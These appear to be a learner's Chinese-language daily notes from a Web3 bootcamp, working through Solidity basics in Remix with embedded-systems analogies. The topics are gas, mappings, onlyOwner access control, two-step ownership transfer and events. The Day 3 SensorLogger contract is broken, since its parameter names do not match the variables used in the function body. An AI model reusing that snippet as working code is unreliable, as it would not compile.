    -   **预期结果：** 你应该能一次性获得一个数组 `[101, 102, 103]`。这是单纯使用 `mapping` 绝对做不到的。
        

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-17-1768655001052-image.png)![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-17-1768655016659-image.png)

### 阶段性里程碑

做完今天的内容，你已经掌握了 Solidity 最核心的 80% 语法：

-   \[x\] 状态机原理
    
-   \[x\] Gas 成本意识
    
-   \[x\] 基础数据类型与结构体
    
-   \[x\] 权限控制 (`modifier`)
    
-   \[x\] 外部通信 (`event`)
    
-   \[x\] **复杂数据存储 (**`mapping` **+** `array`**)** -> _Today_
    

**明日预告（Day 7）：第一周考核项目** 我们要把这些积木搭成一个真正的“红绿灯状态机系统“。

这将是你第一个完整的、带有时间控制逻辑的智能合约项目 。
<!-- DAILY_CHECKIN_2026-01-17_END -->

# 2026-01-16
<!-- DAILY_CHECKIN_2026-01-16_START -->























# 第5天：事件日志 (Events) —— 区块链版的 `printf`

_（注：根据原本的计划，今天应该是讲“高级映射”，但我决定先把“事件”提上来，因为它是解决调试难题的神器，也是嵌入式工程师最熟悉的通信模式。）_

## 1\. 理论映射：串口打印与中断信号

在 STM32 开发中，当系统跑飞或者想知道当前温度是多少时，你会怎么做？

1.  **方法 A (Debug):** 暂停 CPU，用 J-Link 查看内存变量（这就像我们之前用的 `sensors` 按钮，读 Storage）。
    
2.  **方法 B (Log):** 在代码里写 `printf("Temp: %d\n", temp);`，通过串口（UART）把数据吐出来。
    
3.  **方法 C (Interrupt):** 某个引脚电平跳变，触发外部中断，通知主控。
    

在 Solidity 中，**Events (事件)** 同时扮演了 **方法 B** 和 **方法 C** 的角色。

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-16-1768571631108-image.png)

核心概念：

智能合约是“哑巴”，它在链上默默运行。只有通过 emit 发射事件，它才能告诉链下的 Python/JS 脚本：“喂，刚才有人改了数据，ID是101，新温度是25度！”

* * *

## 2\. 语法实战

我们有两个关键字：

1.  `event`: 定义日志格式（类似于定义 `struct` 或报文协议头）。
    
2.  `emit`: 发送日志（类似于调用 `printf`）。
    

**任务：** 修改你的 `SensorLogger`，加上日志功能。

请在 Remix 中新建 `Day5_Events.sol`，输入以下代码（融合了之前的权限控制）：

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EventLogger {
    
    // 1. 定义事件 (协议头)
    // indexed 关键字：相当于建立索引，允许外部工具快速过滤搜索 (类似 Wireshark 的 Filter)
    event DataUpdated(uint256 indexed deviceId, uint256 temperature, address indexed operator);
    
    // 报警事件
    event HighTempAlert(uint256 indexed deviceId, uint256 temperature, string message);

    struct SensorData {
        uint16 temperature;
        bool isValid;
    }
    mapping(uint256 => SensorData) public sensors;
    address public owner;

    constructor() { owner = msg.sender; }

    function updateData(uint256 _id, uint16 _temp) public {
        require(msg.sender == owner, "Auth Fail");

        // [Effects] 修改状态
        sensors[_id] = SensorData(_temp, true);

        // [Interaction] 发射事件 (就像 printf)
        // 这条日志会永久记录在区块里，但不会修改 State (省钱)
        emit DataUpdated(_id, _temp, msg.sender);

        // 模拟简单的阈值报警
        if (_temp > 5000) { // 假设 50.00 度是阈值
            emit HighTempAlert(_id, _temp, "Warning: Overheat!");
        }
    }
}
```

* * *

## 3\. 实验操作：捕捉“串口数据”

### **步骤 1：部署合约**

1.  像往常一样部署 `EventLogger`。
    

### **步骤 2：触发事件**

1.  调用 `updateData`，输入 `101, 2550` (25.5度)。
    
2.  调用 `updateData`，输入 `101, 6000` (60.0度，**触发报警**)。
    

### 步骤 3：查看日志 (核心步骤)

这是很多初学者找不到的地方。

1.  在控制台（Terminal）找到刚刚成功的交易（绿色对勾）。
    
2.  点击展开交易详情。
    
3.  向下滚动，找到 **“Logs”** 字段。
    
    -   它是 JSON 格式的数组。
        
    -   你会看到 `DataUpdated` 和 `HighTempAlert` 的详细内容。
        
    -   注意看 `args` (参数) 里的数据，是不是和你输入的一样？
        

* * *

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-16-1768570899712-image.png)![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-16-1768570919383-image.png)

## 4\. 深度思考：Indexed (索引) 的意义

在代码中，我给 `deviceId` 加了 `indexed` 关键字。

Solidity

```
event DataUpdated(uint256 indexed deviceId, ...);
```

这有什么用？

想象一下，你的合约里有 10,000 个传感器在不断上传数据。

-   **没有 indexed:** 如果你想找“ID 为 101 的所有历史记录”，前端脚本必须把 10,000 条日志全部下载下来，一条条遍历解析。效率极低。
    
-   **有 indexed:** 这里的 `deviceId` 被加入到了 **Bloom Filter (布隆过滤器)** 中。节点可以瞬间告诉你：“只给我 ID=101 的日志”，其他 9999 条直接忽略。
    

**这就像 SQL 里的** `WHERE deviceId = 101`**，或者 Wireshark 里的** `tcp.port == 80`**。**

* * *

### 今日作业

1.  **操作验证：** 运行代码，触发一次报警，截图控制台里的 **Logs** 部分给我看。
    
2.  **思考题：** 既然 `emit Event` 这么便宜（相比于 `SSTORE` 写状态），那为什么我不把所有历史数据（比如每秒的温度）都只用 `Event` 发出来，而根本不存到 `mapping` 里呢？
    
    -   _提示：智能合约自己能读到_ `Event` _吗？如果我想在合约里写一个功能“计算过去 10 次温度的平均值”，只用 Event 能实现吗？_
        

做完这个，我们就彻底打通了“链上（固件）”与“链下（监控软件）”的通信渠道！

### 思考题回答

答：**Event 和 Mapping 都是“SSD”**（它们的数据都会被永久记录在区块链的历史区块中，永远不会消失）。

**真正的区别在于“谁能读”：**

1.  **Mapping (**`SSTORE`**/**`SLOAD`**):**
    
    -   **可见性：** 合约**自己**能读，外部也能读。
        
    -   **嵌入式类比：** **内部 Flash/EEPROM**。CPU 可以读取这里的历史数据来做计算（比如：`if (last_temp > 50) { shutdown(); }`）。
        
    -   **成本：** 极贵。
        
2.  **Event (**`LOG` **opcode):**
    
    -   **可见性：** **合约自己读不到！** 只有链下的外部程序（前端/Python脚本）能读。
        
    -   **嵌入式类比：** **UART 串口打印 (**`printf`**)**。
        
    -   **关键点：** 你在代码里写了 `printf("Temp: 60");`，数据就从串口发走了。MCU（合约）能不能回头去读取刚才发出去的字符串来做加法运算？**不能！** 数据已经离开 CPU 进入了串口线（区块链日志区）。
        

**结论：** 如果你需要“根据历史数据做逻辑判断”**（比如计算平均值、判断是否连续三次报警），必须存 Mapping/Storage。 如果你只是为了**“存证”**或**“通知用户”，后续不再参与合约逻辑计算，那么用 **Event**，能省下 90% 的 Gas 费用 。
<!-- DAILY_CHECKIN_2026-01-16_END -->

# 2026-01-15
<!-- DAILY_CHECKIN_2026-01-15_START -->

























昨天的合约虽然能跑，但在嵌入式领域，这相当于把调试串口（UART Debug Shell）直接暴露到了公网上，任何连上线的人都能发送 AT 指令修改系统参数。

今天要给这个系统加上 **“Root 权限”** 和 **“启动自检代码”**。

## 1\. 理论映射：启动代码与权限位

### **A. 构造函数 (constructor) = SystemInit()**

在 STM32 中，上电复位后，会先执行启动文件（Startup file）里的复位处理函数，初始化时钟、堆栈等。这段代码**只跑一次**。 在 Solidity 中，constructor 就是这段代码。它只在合约**部署（Deployment）** 的瞬间执行一次，之后永远无法再次调用。

通常在这里记录“谁是出厂管理员”。

### B. 全局变量 (msg.sender) = Current\_Task\_PID

在 RTOS 中，通过 osThreadGetId() 知道当前是谁在执行代码。 在 Solidity 中，msg.sender 是一个全局变量，代表**当前正在调用这个函数的地址**。

-   如果是你调用的，它就是你的钱包地址。
    
-   如果是黑客调用的，它就是黑客的地址。
    

### C. 修饰符 (modifier) = ASSERT 宏 / 中间件

这是 Solidity 最优雅的特性之一。它类似于 C 语言的预处理宏，或者是 AOP（面向切面编程）。 我们可以定义一个规则（比如“必须是管理员”），然后把这个标签贴在任何函数头上。函数执行前，会先跑这个规则。

## 2\. 代码实战：加上“防盗锁”

将修改 SensorLogger，增加一个管理员 owner，并且只允许 owner 写入数据。

**请在 Remix 中新建 Day4\_AccessControl.sol，输入以下代码：**

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AccessControlSensor {
    
    // 1. 定义管理员变量 (存在 Flash/Storage 中)
    address public owner;

    struct SensorData {
        uint16 temperature;
        bool isValid;
    }
    mapping(uint256 => SensorData) public sensors;

    // --- 启动代码 (Bootloader) ---
    // 仅在部署瞬间执行一次
    constructor() {
        // msg.sender 在这里代表“部署者” (也就是您)
        owner = msg.sender; 
    }

    // --- 定义修饰符 (宏检查) ---
    modifier onlyOwner() {
        // [Check] 检查当前调用者是不是管理员
        require(msg.sender == owner, "Error: You are not the admin!");
        
        // [Merge] 下划线代表“被修饰函数的代码体”
        // 也就是先执行上面的 require，通过后，再把原来的函数体填在这里执行
        _; 
    }

    // --- 写入函数 (加上了锁) ---
    // 注意头部多了 'onlyOwner' 关键字
    function updateData(uint256 _id, uint16 _temp) public onlyOwner {
        sensors[_id] = SensorData(_temp, true);
    }

    // --- 任何人都可以读取 ---
    function getTemp(uint256 _id) public view returns (uint16) {
        return sensors[_id].temperature;
    }
}
```

## 3\. 攻击模拟实验 (核心环节)

这次我们不能只点一下就完了，我们要模拟“身份切换”。Remix 提供了多个虚拟账户，非常适合做这个测试。

## 第一步：部署 (我是管理员)

1.  确保 **Account** 栏选中的是第一个地址（比如 0x5B3...）。
    
2.  点击 **Deploy**。
    
3.  展开合约，点击 owner 按钮。 确认显示的地址和上面 Account 栏里的地址一模一样。
    

## 第二步：正常写入 (授权操作)

1.  保持 Account 不变。
    
2.  在 updateData 输入 1, 2550。
    
3.  点击 transact。 **结果：** 交易成功（控制台绿色对勾）。
    

## 第三步：黑客攻击 (未授权操作)

1.  **切换账号：** 在左侧 **Account** 下拉菜单中，选择**第二个地址**（比如 0xAb8...）。 _此时您扮演了一个路人/黑客。_
    
2.  再次点击 updateData (输入 1, 9999)。 **结果：** 交易**失败**！控制台出现红色报错。
    
3.  **查看报错原因：** 在控制台报错信息中，寻找 Reason: Error: You are not the admin!。 这正是我们在 require 里写的报错字符串。
    

4\. 深度复盘

做完实验后，请思考这个 modifier 的执行流：

当黑客调用 updateData 时，实际发生的执行顺序是：

1.  进入 onlyOwner 修饰符。
    
2.  执行 require(msg.sender == owner)。 msg.sender 是黑客地址 (0xAb8...)。 owner 是管理员地址 (0x5B3...)。 **不相等 -> 抛出异常 -> 状态回滚。**
    
3.  **根本没有执行到** sensors\[\_id\] = ... 这一行。数据得到了完美保护。
    

![屏幕截图 2026-01-15 224301.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-15-1768489356926-_____2026-01-15_224301.png)![屏幕截图 2026-01-15 221308.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-15-1768489330308-_____2026-01-15_221308.png)

**今日作业：**如果您想把权限移交给别人（比如把设备卖给了客户），应该怎么写？ _试着添加一个 function changeOwner(address newOwner) 函数。_ _提示：这个函数本身也需要加 onlyOwner 吗？如果不加会发生什么？_

### 答：版本 A：直球版 (C 语言思维)

这是最直接的实现，类似于 C 语言中的指针重新赋值。

**⚠️ 这种写法的风险（嵌入式类比）：** 这就像通过串口发送一条指令修改波特率。如果手抖把波特率改成了乱码，由于通信已经断开，**再也无法**发指令改回去了。设备直接变砖。 同理，如果您把 `_newOwner` 输错了一位，或者输成了一个没人控制的地址，合约的管理员权限就**永久丢失**了。

**逻辑：**

1.  检查调用者是不是现任管理员 (`onlyOwner`)。
    
2.  检查新地址是不是“空指针” (`address(0)`)。
    
3.  直接覆盖 `owner` 变量。
    

```
// 在您的 AccessControlSensor 合约中添加：

function changeOwner(address _newOwner) public onlyOwner {
    // [Check] 防止手抖把权限转给 0x0000...0000 (空地址)
    require(_newOwner != address(0), "New owner is the zero address");

    // [Effect] 立即移交权限
    owner = _newOwner;
}
```

### 版本 B：两步验证法 (Web3 / Rust 安全思维)

这是您想要的“更好的建议”。在 Rust 中，所有权（Ownership）的转移是非常严谨的。在 Web3 智能合约中，为了防止“变砖”，我们采用 **"Offer - Accept" (提议-接受)** 模式。

**嵌入式类比：** 这就像 TCP 的 **三次握手**，或者 SPI 通信中的 **Master-Slave 握手**。

1.  **Master (现任管理员):** “我想把 Master 权限给从机 B。” (发送请求)
    
2.  **Slave B (新管理员):** “收到，我确认接管。” (发送 ACK)
    
3.  **系统:** “权限移交完成。”
    

如果 Slave B 没有响应（地址输错/私钥丢失），权限**仍然保留在 Master 手里**，系统不会挂掉。

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SafeAccessControl {
    address public owner;
    address public pendingOwner; // 暂存的新管理员地址

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // --- 步骤 1: 现任管理员发起移交 ---
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0), "Unsafe address");
        // 这里不直接改 owner，而是给 pendingOwner 赋值
        pendingOwner = _newOwner;
    }

    // --- 步骤 2: 新管理员确认接收 ---
    // 这个函数必须由 _newOwner 亲自调用
    function acceptOwnership() public {
        // [Check] 检查调用者是不是被指定的接班人
        require(msg.sender == pendingOwner, "You are not the pending owner");
        
        // [Effect] 正式移交
        owner = pendingOwner;
        pendingOwner = address(0); // 清空暂存区
    }
}
```

-   **部署** `SafeAccessControl` (使用账号 A)。
    
-   **发起移交 (transferOwnership):**
    
    -   使用账号 A。
        
    -   输入账号 B 的地址。
        
    -   点击 transact。
        
    -   _此时查看_ `owner`_，仍然是账号 A。_
        
-   **黑客尝试截胡 (模拟):**
    
    -   切换到账号 C。
        
    -   点击 `acceptOwnership`。
        
    -   _结果：报错 "You are not the pending owner"。_
        
-   **接受移交 (acceptOwnership):**
    
    -   切换到账号 B (必须是刚才指定的那个)。
        
    -   点击 `acceptOwnership`。
        
    -   _此时查看_ `owner`_，变成了账号 B。_
        

![屏幕截图 2026-01-15 224301.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-15-1768489534376-_____2026-01-15_224301.png)

### 为什么说这是 Rust 思维？

在 Rust 语言中，资源的所有权管理极其严格。你不能随便把一个变量的所有权“扔”给别人，必须确保作用域的安全性。 这种 **Two-Step Transfer** 模式体现了 Rust 的 **Explicit ensures Safety (显式即安全)** 哲学：

-   **不隐式发生：** 重要的状态变更必须有显式的“接受”动作。
    
-   **故障安全 (Fail-safe)：** 如果中间任何一步出错，系统回退到原有的安全状态（旧管理员依然拥有权限），而不是进入未定义的 Panic 状态。
<!-- DAILY_CHECKIN_2026-01-15_END -->

# 2026-01-14
<!-- DAILY_CHECKIN_2026-01-14_START -->


























# 第三天 **：Solidity语法与核心数据结构**。

对于C 语言老手来说，学习 Solidity 的语法就像是换了一种方言，大体逻辑是通的，但有几个非常反直觉的“内存陷阱”需要特别注意。

今天的目标是：**编写一个工业级的“传感器数据上链”合约。**

## **理论映射：三大存储空间 (The Data Location)**

在 STM32 中，数据是放在 Flash（只读/持久化）、SRAM（读写/易失）还是寄存器里。 在 Solidity 中，必须**显式声明**变量存储在以下三个区域之一，否则编译器会报错。这是它和 Python/JS 最大的不同。

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-14-1768405004145-image.png)

**嵌入式思维转换：**

-   **storage 就是写 Flash。** 它是状态变量的默认位置。永远不要为了临时计算而在 storage 里读写，那会让您的用户破产。
    
-   **memory 就是局部变量。** 在函数内部定义的复杂类型（如结构体、数组）需要加 memory 关键字。
    

## 核心数据结构：Mapping (映射) vs Array

我习惯用 SensorData logs\[100\]（数组）。 但在区块链上，数组非常危险（Gas 消耗随长度线性增加），所以改用为**mapping**。

-   **定义：** mapping(KeyType => ValueType)
    
-   **本质：** 一个巨大的**哈希表 (Hash Table)**。
    
-   **怪癖（与 C 的最大区别）：**
    
    1.  **没有长度： 无法获取 mapping.length。**
        
    2.  **无法遍历： 不能写 for (i in mapping)。必须知道 Key 才能拿到 Value。**
        
    3.  **全空间初始化： 它的逻辑空间包含所有可能的 Key。访问一个从未写入的 Key，不会报错，也不会读到垃圾值，而是返回 全0 (默认值)。**
        

## **代码实战：编写 SensorLogger 合约**

```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

 

contract SensorLogger {

   

    // --- 1. 数据结构定义 (类似于 struct) ---

    struct SensorData {

        uint8 id;           // 传感器ID (uint8: 0-255)

        uint16 temperature; // 温度 (定点数: 2550 代表 25.50度)

                            // 注意: Solidity 没有 float/double 类型！必须用整数表示。

        uint32 timestamp;   // UNIX 时间戳

        bool isValid;       // 状态标志位

    }

 

    // --- 2. 永久存储区 (Flash / Storage) ---

    // 这是一个哈希表：设备ID (Key) -> 传感器数据 (Value)

    // 'public' 关键字会自动生成一个 getter 函数

    mapping(uint256 => SensorData) public sensors;

 

    // --- 3. 写入函数 (Flash Write) ---

    function updateData(uint256 deviceId, uint16 temp) public {

        // [Check] 简单的参数检查

        require(_deviceId > 0, "Invalid Device ID");

 

        // [Effects] 写入 Storage

        // block.timestamp 是当前区块的时间 (类似于 RTC 时间)

        sensors[_deviceId] = SensorData({

            id: uint8(_deviceId),

            temperature: _temp,

            timestamp: uint32(block.timestamp),

            isValid: true

        });

    }

 

    // --- 4. 读取函数 (Flash Read) ---

    // 'view' 表示只读，不修改状态。

    // 如果是外部(User)直接调用，不消耗 Gas。如果是合约内部调用，消耗极少 Gas。

    function getTemperature(uint256 _deviceId) public view returns (uint16) {

        // 从 Storage 读取数据到 Memory (RAM)

        SensorData memory data = sensors[_deviceId];

       

        // 检查数据是否有效 (类似于检查 Flash 里的 Magic Number)

        if (data.isValid) {

            return data.temperature;

        } else {

            return 0; // 或者抛出错误

        }

    }

}
```

## 部署与实验

**环境选择：** 依然使用 **Remix VM (Cancun)**，速度快。

1.  **Compile (编译): 确保绿色对勾。**
    
2.  **Deploy (部署): 点击橙色 Deploy 按钮。**
    
3.  **展开合约 进行交互：**
    

**实验 A：写入数据 (Update)**

-   找到 updateData 函数。
    
-   \_deviceId: 输入 101。
    
-   \_temp: 输入 2550 (代表 25.50 度)。
    
-   点击 **transact**。
    
-   _观察控制台：_ 只有写入操作才会消耗 Gas。
    

**实验 B：读取数据 (Read)**

-   找到 sensors 按钮（这是 public mapping 自动生成的）。
    
-   输入 101，点击 call。
    
    -   之后会看到返回的 tuple 数据：ID, temp, timestamp, true。
        
-   找到 getTemperature 按钮。
    
-   输入 101，点击 call。
    
    -   返回 2550。
        

**实验 C：访问未初始化的内存 (关键！)**

-   在 getTemperature 中输入 999 (一个从未写过的 ID)。
    
-   点击 call。
    
-   **问题：** 它返回了什么？是报错了，还是乱码，还是 0？
    

**思考题：** 这次写入大概消耗了多少 Gas？（通常是 **4万到5万** 左右）。 对比一下昨天那个简单的 `counter++`（约 2万多），为什么这次贵了这么多？

-   _提示：昨天只是修改了一个已经存在的整数，今天是_**_第一次_**_为一个新的 Key (_`101`_) 初始化结构体，相当于在 Flash 上开辟了一块新扇区，这是最贵的操作。_
    

回答：

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-14-1768405228350-image.png)![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-14-1768405200798-image.png)

### 困惑一：`call sensors` 的目的是什么？是生成 ID 吗？

**答案：不是生成，而是“直读内存”。**

-   **现象：** 您没有写 `function sensors()...` 这个函数，但 Remix 里却出现了一个蓝色的 `sensors` 按钮。
    
-   **原理（关键字** `public` **的魔法）：** 在代码第 18 行：`mapping(uint256 => SensorData) public sensors;` 当您给变量加上 `public` 关键字时，编译器（Solidity）会自动为您生成一个**同名的读取函数**。
    
-   **嵌入式类比：**
    
    -   `getTemperature` **(您写的函数):** 就像您封装的一个 API `float Sensor_GetVal(id)`。它里面有逻辑（比如判断 `isValid`，如果无效返回 0）。
        
    -   `sensors` **(自动生成的):** 就像通过 **JTAG/调试器** 直接查看内存地址 `0x20001000`。它不带任何逻辑，直接把那个存储槽（Slot）里的原始数据（ID, Temp, Timestamp, Bool）全部吐出来给您看。
        

**所以，它的目的是：** 让（开发者）方便地去“查账”，验证数据到底存进去没有。

### 困惑二：实验 C 返回 0，怎么判断 bool 值？

**答案：通过** `getTemperature` **函数您确实判断不了（因为它把 bool 丢弃了），但通过** `sensors` **可以看到。**

请看代码对比：

**场景：访问不存在的 ID (999)**

1.  **如果您调用** `getTemperature(999)`**：**
    
    -   **代码逻辑：** 函数签名是 `returns (uint16)`。内部逻辑是：如果 `isValid` 是 false，则 `return 0`。
        
    -   **结果：** 只拿到了 `0`。此时确实**无法区分**“这是真的 0 度”还是“数据不存在”。这正是这个函数的逻辑缺陷，也是为什么我们需要 Event 或 Revert
        
2.  **如果您调用** `sensors(999)` **(蓝色的那个按钮)：**
    
    -   **请现在尝试操作一下：** 在 `sensors` 按钮输入 999，点击 call。
        
    -   **预期结果：** 之后会看到类似这样的元组：
        
        Plaintext
        
        ```
        0: uint8: id 0
        1: uint16: temperature 0
        2: uint32: timestamp 0
        3: bool: isValid false   <-- 这里！
        ```
        
    -   **结论：** 在 Solidity 中，**所有未初始化的内存都是全 0**（bool 的 0 就是 false）。
<!-- DAILY_CHECKIN_2026-01-14_END -->

# 2026-01-13
<!-- DAILY_CHECKIN_2026-01-13_START -->



























# **Day 2：EVM 指令集与 Gas 机制（学习笔记）**

## 1）把 EVM 当作“按指令计费 / 基于堆栈”的虚拟 CPU

**EVM 可以理解为一个堆栈机（stack machine）**：大多数运算都在栈顶完成（push / pop / op）。

Gas 机制可以理解为**“按指令与资源消耗计费”**：

\- 指令执行要花 Gas

\- 读写存储（storage）更贵

\- 超出 Gas 限额就会\*\*强制终止并回滚\*\*

\---

## **2）理论映射（嵌入式对照）**

\- **ARM Cortex-M：寄存器架构（register-based）**

\- **EVM：堆栈架构（stack-based）**

\> 嵌入式里你经常“螺蛳壳内做道场”，RAM 紧张`uint8_t` / `uint16_t` 用得多；

\> 但在 Solidity/EVM 里，很多时候更推荐直接用 EVM 原生字长`uint256`（对齐 EVM 256-bit word），避免不必要的类型转换成本和复杂度。

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-13-1768313068628-image.png)

\---

## 3）实践：触发第一个“看门狗复位”（Gas 耗尽）

**目标**：写一个“死循环”，亲眼看见 Gas 如何强行终止程序（类比 WDT Reset）。

\#### 合约代码

\`\`\`solidity

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract GasTest {

uint256 public counter = 0;

// 会触发“看门狗复位”（Gas耗尽）的函数

function foreverLoop() public {

// while(true) 的区块链版本

while (true) {

counter++;

}

}

// 正常函数：用于对比 Gas 消耗

function normalAdd() public {

counter++;

}

}

现象记录

-   `normalAdd()` 能正常给 `counter + 1`
    
-   `foreverLoop()` 调用后 `counter` **不会增加**
    
    -   我在调用 `foreverLoop()` 前后读取 `counter`，发现值完全一样
        
    -   说明：Gas 耗尽后交易失败，**状态被回滚**（increment 也“当没发生过”）
        

进一步观察

-   在 **Compile Details** 里查看 **BYTECODE**：在 opcodes 中能看到大量 `JUMP`
    
-   这个“死循环”本质就是靠 `JUMP` 不断跳转实现
    

* * *

### 4）反思复盘（工程经验固化）

4.1 忌讳无界循环（Unbounded Loop）

永远不要写这种逻辑：

```solidity
for (uint i = 0; i < users.length; i++) { ... }
```

因为一旦 `users.length` 变成 10,000，循环次数可能超过区块可承受的 Gas 上限，导致：

-   交易永远失败
    
-   函数逻辑等价于“永久卡死，再也跑不起来”
    

4.2 嵌入式类比：ISR 里做重活 = 直接把系统拖死

这就像你在中断服务函数（ISR）里塞了一个耗时 1 秒的操作：

-   主循环被打断
    
-   实时性崩掉
    
-   系统看起来“还活着”，其实已经不可用
    

4.3 Check-Effects-Interactions（CEI）与回滚直觉

-   由于以太坊的状态回滚机制：只要最终失败，前面做的状态修改都会撤销
    
-   所以我们不需要担心“改了一半”的脏状态残留问题
    
-   但仍然要坚持 CEI：
    
    -   **Check**：先校验前置条件
        
    -   **Effects**：再更新状态
        
    -   **Interactions**：最后做外部交互（防重入、防意外失败）
        

* * *

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-13-1768313034569-image.png)![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-13-1768313053291-image.png)
<!-- DAILY_CHECKIN_2026-01-13_END -->

# 2026-01-12
<!-- DAILY_CHECKIN_2026-01-12_START -->




























# **Day 1 学习总结：我开始用“系统工程”理解以太坊**

今天我最大的收获是：

我不再把以太坊当成“转账网络”，而是把它当成一个**分布式状态机**。  
交易也不只是“转钱”，而是一次次**状态变更请求**：我们把请求广播出去，全网验证、排序、执行，然后把结果写进一个所有人都能复算的公共状态。很像做自动化/工作流——看流程怎么跑、日志怎么记、结果能不能重放，而不是某些公司，关键先生一言堂。

**区块链的核心也不只是账本**，更像一套“可验证的协作协议”：  
Web2 靠中心平台、权限和法律背书；Web3 把规则写进合约，用共识+密码学+可重放日志保证一致性。

信任没有消失，只是从“信机构”变成“信过程”，**信任被工程化了**。

**钱包不是存钱的，是控制权**：它本质是**密钥管理+签名器**。余额变化不是“钱包里多了钱”，而是链上状态变了。

我们真正拥有的不是账户，而是私钥这把钥匙。

**安全上我今天记住一句话**：危险的往往不是 value（转多少），而是 data（我们签了什么）。

很多事故不是转账，而是**授权/签名**把权限交出去了。

**Gas 可以理解为付费计算+反滥用**：gasUsed 是实际消耗，gasLimit 是预算上限，失败也会花费，因为执行发生了只是回滚。

最后，**Sepolia 测试网不是玩具**：对我来说最值钱的是端到端闭环和可观测性（hash/receipt/logs/nonce/revert）。

它是主网的预设项，只是币没价值、稳定性可能差一点。

总结一下就是：  
**以太坊=分布式状态机；区块链=可验证协作；钱包=控制权；交易=状态变更；Gas=付费计算；测试网=主网彩排。**

_小狐狸转账钱包的截图_

![屏幕截图 2026-01-12 193830.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-12-1768232261149-_____2026-01-12_193830.png)

_简单看了老师们写的书（检视阅读），building的欲望越来越强烈了_

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-12-1768232444538-image.png)![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-12-1768232417925-image.png)
<!-- DAILY_CHECKIN_2026-01-12_END -->
<!-- Content_END -->
